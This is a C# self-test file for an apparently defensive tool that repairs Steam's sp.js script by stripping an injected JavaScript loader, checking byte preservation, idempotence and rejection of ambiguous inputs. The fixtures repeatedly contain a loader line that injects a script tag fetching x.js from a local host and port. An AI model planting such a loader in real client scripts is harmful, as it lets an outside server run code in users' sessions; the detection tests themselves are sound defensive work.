using System.IO;
using System.Text;
using SteamSentinel.Core.Inspection;

namespace SteamSentinel.SelfTest;

internal static partial class Program
{
    private static async Task TestSteamScriptRepairAsync(string root)
    {
        const string loader = ";try{var s=document.createElement(\"script\");s.src=\"http://127.0.0.1:8137/x.js?\"+Date.now();document.head.append(s)}catch{}";
        byte[] loaderBytes = Encoding.ASCII.GetBytes(loader);
        string[] prefixes =
        [
            "(()=>{window.synthetic=1;})();\n",
            "\uFEFF(()=>{const label='中文';})();\r\n",
            "const escaped=\"quote\\\" and slash\\\\\"; // ordinary comment\r\n",
            "const pattern=/[{}()\\[\\]/*]/g;const quotient=12/3;\n",
            "if(true) /[(){}]/.test('value');\n",
            "const text=" + (char)0x60 + "prefix $" + "{(()=>{return " + (char)0x60 + "nested $" + "{1}" + (char)0x60 + ";})()} suffix" + (char)0x60 + ";\n",
            "/* preceding comment */const data={nested:{values:[1,2,3]}};\n",
            "const escapedIdentifier=\\u0061;const key\\u0061=1;\n",
            "(()=>{const keyboard={\\u3131:\"\\u1100\",\\u3132:\"\\u1101\",\\u3134:\"\\u1102\"};})();\r\n"
        ];
        foreach (string prefix in prefixes)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(prefix + loader + new string(' ', 31));
            byte[] original = (byte[])bytes.Clone();
            bool changed = SteamScriptRepair.TryRepair(bytes, out byte[] repaired);
            byte[] expected = Encoding.UTF8.GetBytes(prefix + new string(' ', loader.Length + 31));
            Check("Steam script repair preserves bytes outside the loader " + Array.IndexOf(prefixes, prefix),
                changed && bytes.SequenceEqual(original) && repaired.SequenceEqual(expected) && repaired.Length == original.Length);
            Check("Steam script repair is idempotent " + Array.IndexOf(prefixes, prefix),
                changed && !SteamScriptRepair.TryRepair(repaired, out byte[] second) && second.Length == 0);
        }
        byte[] noPadding = Encoding.ASCII.GetBytes("ready();\n" + loader);
        Check("Steam script repair accepts an exact-fit source-map slot", SteamScriptRepair.TryRepair(noPadding, out _));
        // Text fixtures only. Neither the scanner nor these tests evaluate JavaScript.
        string[] rejected =
        [
            "ready();\n", "\n" + loader, "ready();" + loader, "ready();\r" + loader,
            "ready();\n" + loader + "\n", "ready();\n" + loader + "\t", "ready();\n" + loader + "other();",
            "ready();\n" + loader + "\n" + loader, "ready();\n" + loader[..^1],
            "ready();\n" + loader.Replace("127.0.0.1", "localhost"), "ready();\n" + loader.Replace("8137", "9999"),
            "ready();\n" + loader.Replace("append(s)", "appendChild(s)"), "ready();\n" + loader.Replace("var s=", "var alternative="),
            "ready();\n" + loader.Replace("\"script\"", "\"img\""),
            "/* an unclosed documentation comment\n" + loader, "const example='\n" + loader,
            "const example='escaped\\\n" + loader, "const example=" + (char)0x60 + "\n" + loader,
            "const example=" + (char)0x60 + "$" + "{value}\n" + loader, "const example=/unclosed\n" + loader,
            "function unfinished(){\n" + loader, "const value=(1;\n" + loader, "const value=1+\n" + loader,
            "if(ready)\n" + loader, "const invalid=([)];\n" + loader,
            "const invalid=\\u0030;\n" + loader, "const invalid=\\u00ZZ;\n" + loader,
            "const invalid=\\u006;\n" + loader, "const invalid=\\u002f;\n" + loader,
            "const invalid=\\uD800;\n" + loader, "const invalid=\\u{61};\n" + loader,
            "const keyword=\\u0072eturn\n" + loader,
            "{} /ambiguous/;\n" + loader, "const prior='http://127.0.0.1:8137/x.js';\n" + loader,
            "const prior='/x.js?';\n" + loader,
            "var extra=document.createElement('script');extra.src='http://localhost:9999/other.js';document.head.append(extra);\n" + loader
        ];
        foreach (string input in rejected)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(input);
            Check("Steam script repair rejects unsupported or ambiguous text " + Array.IndexOf(rejected, input),
                !SteamScriptRepair.TryRepair(bytes, out byte[] repaired) && repaired.Length == 0);
        }
        byte[] invalidUtf8 = [0xff, (byte)';', (byte)'\n', .. loaderBytes];
        Check("Steam script repair rejects invalid UTF-8", !SteamScriptRepair.TryRepair(invalidUtf8, out _));
        Check("Steam script repair rejects UTF-16", !SteamScriptRepair.TryRepair(Encoding.Unicode.GetBytes("ready();\n" + loader), out _));
        string nested = new('(', 257);
        byte[] deep = Encoding.ASCII.GetBytes(nested + "1" + new string(')', 257) + ";\n" + loader);
        Check("Steam script repair bounds delimiter nesting", !SteamScriptRepair.TryRepair(deep, out _));
        byte[] oversized = new byte[SteamScriptRepair.MaximumBytes + 1];
        oversized.AsSpan().Fill((byte)' ');
        "ready();\n"u8.CopyTo(oversized);
        loaderBytes.CopyTo(oversized, "ready();\n".Length);
        Check("Steam script repair bounds input size", !SteamScriptRepair.TryRepair(oversized, out _));
        // The real local sp.js corpus specimen is 16,297,789 bytes. Keep that
        // regression independent of the implementation's configured byte limit.
        byte[] realisticSize = new byte[16_297_789];
        realisticSize.AsSpan().Fill((byte)' ');
        "ready();\n"u8.CopyTo(realisticSize);
        loaderBytes.CopyTo(realisticSize, "ready();\n".Length);
        Check("Steam script repair allows actual Steam sp.js sizes", SteamScriptRepair.TryRepair(realisticSize, out _));
        byte[] atLimit = new byte[SteamScriptRepair.MaximumBytes];
        atLimit.AsSpan().Fill((byte)' ');
        "ready();\n"u8.CopyTo(atLimit);
        loaderBytes.CopyTo(atLimit, "ready();\n".Length);
        Check("Steam script repair accepts the inclusive byte limit", SteamScriptRepair.TryRepair(atLimit, out byte[] atLimitRepaired) &&
            atLimitRepaired.Length == atLimit.Length && atLimitRepaired.AsSpan("ready();\n".Length).IndexOfAnyExcept((byte)' ') < 0);
        string path = Path.Combine(root, "steam-script-byte-fixture.js");
        await File.WriteAllBytesAsync(path, noPadding);
        byte[] snapshot = await File.ReadAllBytesAsync(path);
        Check("Steam script repair only proposes a byte array", SteamScriptRepair.TryRepair(snapshot, out _) &&
            (await File.ReadAllBytesAsync(path)).SequenceEqual(noPadding));
    }
}
